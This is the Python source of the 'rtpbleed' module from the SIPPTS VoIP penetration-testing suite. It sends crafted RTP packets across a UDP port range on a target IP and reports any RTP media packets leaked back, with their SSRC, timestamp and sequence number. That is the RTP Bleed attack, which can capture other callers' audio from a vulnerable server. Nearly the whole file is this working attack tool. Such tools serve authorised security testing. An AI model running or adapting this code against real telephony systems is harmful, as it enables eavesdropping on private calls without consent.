#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.2'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

# based in rtpnatscan: https://github.com/kapejod/rtpnatscan

import socket
import fcntl
import os
import sys
import time
from lib.color import Color
from lib.logos import Logo


class RTPBleed:
    def __init__(self):
        self.ip = ''
        self.start_port = '10000'
        self.end_port = '20000'
        self.loops = '4'
        self.payload = '0'
        self.delay = '50'

        self.c = Color()

    def start(self):
        self.start_port = int(self.start_port)
        self.end_port = int(self.end_port)
        self.loops = int(self.loops)
        self.payload = int(self.payload)
        self.delay = int(self.delay)

        logo = Logo('rtpbleed')
        logo.print()

        print(self.c.BWHITE + '[!] Target IP: ' +
              self.c.YELLOW + '%s' % self.ip)
        print(self.c.BWHITE + '[!] Port range:' + self.c.YELLOW + ' %d' %
              self.start_port + self.c.WHITE + '-' + self.c.YELLOW + '%d' % self.end_port)
        print(self.c.BWHITE + '[!] Payload type: ' +
              self.c.YELLOW + '%d' % self.payload)
        print(self.c.BWHITE + '[!] Number of tries per port: ' +
              self.c.YELLOW + '%d' % self.loops)
        print(self.c.BWHITE + '[!] Delay between tries: ' +
              self.c.YELLOW + '%d microseconds' % self.delay)
        print(self.c.WHITE)

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except socket.error:
            print(self.c.RED + 'Failed to create socket' + self.c.WHITE)
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        port = self.start_port

        while port < self.end_port+2:
            try:
                host = (str(self.ip), port)

                loop = 0

                while loop < self.loops:
                    cloop = str(loop).zfill(4)
                    cpayload = '%s' % hex(0x80 | self.payload & 0x7F)[2:]
                    # byte[0] = 0x80 => RTP version 2
                    # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                    # byte[2-3] = Sequence number
                    message = ('80'+cpayload+cloop+'0000000000000000')
                    byte_array = bytearray.fromhex(message)

                    print(self.c.YELLOW + '[+] Checking port: %d with payload type %d (Seq number: %d)  ' %
                          (port, self.payload, loop+1), end="\r")

                    # Send data
                    sock.sendto(byte_array, host)
                    time.sleep((self.delay+loop)/1000.0)

                    loop += 1

                    try:
                        (msg, addr) = sock.recvfrom(4096)
                        (ipaddr, rport) = addr
                        size = len(msg)

                        if size >= 12:
                            # print(msg)
                            x = '%s%s' % (hex(msg[2])[2:], hex(msg[3])[2:])
                            seq = int('0x%s' % x, base=16)
                            x = '%s%s%s%s' % (hex(msg[4])[2:], hex(msg[5])[
                                              2:], hex(msg[6])[2:], hex(msg[7])[2:])
                            timestamp = int('0x%s' % x, base=16)
                            ssrc = '%s%s%s%s' % (hex(msg[8])[2:], hex(
                                msg[9])[2:], hex(msg[10])[2:], hex(msg[11])[2:])

                            print(self.c.YELLOW + '\n[+] received %d bytes from target port %d - loop %d' %
                                  (size, rport, loop))
                            print(self.c.WHITE + '    [-] SSRC: %s - Timestamp: %s - Seq number: %s' %
                                  (ssrc, timestamp, seq))
                    except:
                        # No data available
                        continue
            except KeyboardInterrupt:
                print(self.c.YELLOW + '\nYou pressed Ctrl+C!')
                exit()
            except:
                pass

            port += 2

        print(self.c.WHITE)
